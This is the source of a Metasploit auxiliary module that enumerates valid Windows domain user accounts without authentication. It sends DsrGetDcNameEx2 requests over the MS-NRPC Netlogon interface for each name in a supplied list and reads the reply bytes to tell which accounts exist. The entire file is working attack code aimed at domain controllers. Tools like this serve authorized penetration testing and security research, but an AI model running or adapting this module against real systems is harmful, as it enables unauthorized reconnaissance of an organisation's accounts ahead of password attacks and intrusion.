##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::DCERPC
  Netlogon = RubySMB::Dcerpc::Netlogon

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'MS-NRPC Domain Users Enumeration',
        'Description' => %q{
          This module will enumerate valid Domain Users via no authentication against MS-NRPC interface.
          It calls DsrGetDcNameEx2 to check if the domain user account exists or not. It has been tested with
          Windows servers 2012, 2016, 2019 and 2022.
        },
        'Author' => [
          'Haidar Kabibo <https://x.com/haider_kabibo>'
        ],
        'References' => [
          ['URL', 'https://github.com/klsecservices/Publications/blob/master/A_journey_into_forgotten_Null_Session_and_MS-RPC_interfaces.pdf']
        ],
        'License' => MSF_LICENSE
      )
    )
    register_options(
      [
        OptPort.new('RPORT', [false, 'The netlogon RPC port']),
        OptPath.new('USER_FILE', [true, 'Path to the file containing the list of usernames to enumerate'])
      ]
    )
  end

  class DsrGetDCNameEx2Request < BinData::Record
    attr_reader :opnum

    endian :little

    uint32 :computer_name, initial_value: 0x00000000
    logonsrv_handle :account_name
    ndr_uint32 :allowable_account_control_bits, initial_value: 0x200
    uint32 :domain_name, initial_value: 0x00000000
    uint32 :guid, initial_value: 0x00000000
    uint32 :site_name, initial_value: 0x00000000
    uint32 :flags, initial_value: 0x00000000

    def initialize_instance
      super
      @opnum = 34
    end
  end

  def bind_to_netlogon_service
    @dport = datastore['RPORT']
    if @dport.nil? || @dport == 0
      @dport = dcerpc_endpoint_find_tcp(datastore['RHOST'], Netlogon::UUID, '1.0', 'ncacn_ip_tcp')
      fail_with(Failure::NotFound, 'Could not determine the RPC port used by the Microsoft Netlogon Server') unless @dport
    end
    handle = dcerpc_handle(Netlogon::UUID, '1.0', 'ncacn_ip_tcp', [@dport])
    print_status("Binding to #{handle}...")
    dcerpc_bind(handle)
  end

  def dsr_get_dc_name_ex2(username)
    request = DsrGetDCNameEx2Request.new(account_name: username)

    begin
      raw_response = dcerpc.call(request.opnum, request.to_binary_s)
    rescue Rex::Proto::DCERPC::Exceptions::Fault
      fail_with(Failure::UnexpectedReply, "The Netlogon RPC request failed for username: #{username}")
    end
    raw_response
  end

  def run_host(ip)
    usernames = load_usernames(datastore['USER_FILE'])
    bind_to_netlogon_service

    usernames.each do |username|
      enumerate_user(username)
    end
  end

  private

  def load_usernames(file_path)
    unless ::File.exist?(file_path)
      fail_with(Failure::BadConfig, 'The specified USER_FILE does not exist')
    end

    usernames = []
    ::File.foreach(file_path) do |line|
      usernames << line.strip
    end
    usernames
  end

  def enumerate_user(username)
    response = dsr_get_dc_name_ex2(username)
    if response[-4, 4] == "\x00\x00\x00\x00"
      print_good("#{username} exists")
    else
      print_error("#{username} does not exist")
    end
  end
end
